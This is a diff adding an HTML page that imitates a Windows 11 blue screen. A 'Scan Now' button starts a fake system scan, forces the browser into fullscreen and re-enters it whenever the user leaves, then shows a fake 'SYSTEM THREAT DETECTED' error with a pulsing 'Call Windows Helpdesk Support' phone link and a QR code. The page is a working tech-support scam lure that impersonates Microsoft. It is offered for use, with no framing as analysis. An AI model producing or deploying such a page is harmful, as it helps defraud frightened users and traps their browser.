@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows 11 Blue Screen Error</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Full-Screen Base Blue */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0078D7; /* Windows 11 BSOD Blue */
+            position: relative;
+            text-align: center;
+        }
+
+        /* Windows 11 Background Overlay */
+        .background-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://wallpaperaccess.com/full/4704271.jpg'); /* Windows 11 Default Background */
+            background-size: cover;
+            background-position: center;
+            opacity: 0.3; /* Adjust transparency */
+            filter: blur(8px); /* Soft Blur Effect */
+            z-index: -1;
+        }
+
+        /* Windows Logo (Top Right) */
+        .windows-logo {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            width: 120px;
+            opacity: 0.9;
+        }
+
+        /* Blue Screen Content */
+        .bsod-container {
+            text-align: center;
+            max-width: 700px;
+        }
+
+        .bsod-container h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .bsod-container p {
+            font-size: 1.5em;
+            margin-bottom: 20px;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #00ff00;
+            transition: width 0.5s;
+        }
+
+        /* Scan Now Button */
+        .scan-button {
+            background: #ffffff;
+            color: #0078D7;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.2em;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .scan-button:hover {
+            background: #dddddd;
+        }
+
+        /* Error Warning at 90% */
+        .error-message {
+            display: none;
+            font-size: 1.3em;
+            color: #ff0000;
+            margin-top: 20px;
+        }
+
+        /* QR Code */
+        .qr-code-container {
+            width: 150px;
+            height: 150px;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/d/d3/QR_Code_example.png');
+            background-size: cover;
+            background-position: center;
+            margin: 20px auto;
+            display: none;
+        }
+
+        /* Call Support Button */
+        .call-support {
+            display: none;
+            background: #ff0000;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+            animation: pulse 0.5s infinite;
+        }
+
+        .call-support:hover {
+            background: #cc0000;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
+            50% { transform: scale(1.1); box-shadow: 0 0 20px rgba(255, 0, 0, 1); }
+            100% { transform: scale(1); box-shadow: 0 0 10px rgba(255, 0, 0, 0.7); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Overlay -->
+    <div class="background-overlay"></div>
+
+    <!-- Windows Logo -->
+    <img class="windows-logo" src="https://www.logo.wine/logo/Microsoft" alt="Windows Logo">
+
+    <!-- Blue Screen Content -->
+    <div class="bsod-container">
+        <h1>😟 Your PC ran into a problem and needs to restart.</h1>
+        <p>We're collecting some error info, and then we'll restart for you.</p>
+        <p id="scanStatus">System will restart soon...</p>
+
+        <!-- Scan Now Button -->
+        <button class="scan-button" id="startScan">Scan Now</button>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <!-- Fake Error Warning -->
+        <p class="error-message" id="errorMessage">
+            ERROR CODE: <strong>0x0000DEAD</strong> - SYSTEM THREAT DETECTED
+        </p>
+
+        <!-- QR Code -->
+        <div class="qr-code-container" id="qrCode"></div>
+
+        <!-- Call Support Button -->
+        <a href="tel:+18009009999" class="call-support" id="callSupport">📞 Call Windows Helpdesk Support</a>
+    </div>
+
+    <script>
+        function enterFullScreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+            }
+        }
+
+        function preventExitFullScreen() {
+            document.addEventListener("fullscreenchange", () => {
+                if (!document.fullscreenElement) {
+                    enterFullScreen();
+                }
+            });
+        }
+
+        function startScan() {
+            enterFullScreen();
+            preventExitFullScreen();
+
+            document.getElementById("startScan").style.display = "none";
+            document.getElementById("progressBar").style.display = "block";
+
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                document.getElementById("progressFill").style.width = `${progress}%`;
+                document.getElementById("scanStatus").textContent = `Scanning system files... ${progress}% complete`;
+
+                if (progress >= 90) {
+                    clearInterval(scanInterval);
+                    document.getElementById("errorMessage").style.display = "block";
+                    document.getElementById("progressFill").style.background = "#ff0000";
+                    document.getElementById("scanStatus").textContent = "System Threat Detected!";
+                    document.getElementById("callSupport").style.display = "inline-block";
+                    document.getElementById("qrCode").style.display = "block";
+                }
+            }, 800);
+        }
+
+        document.getElementById("startScan").addEventListener("click", startScan);
+    </script>
+</body>
+</html>
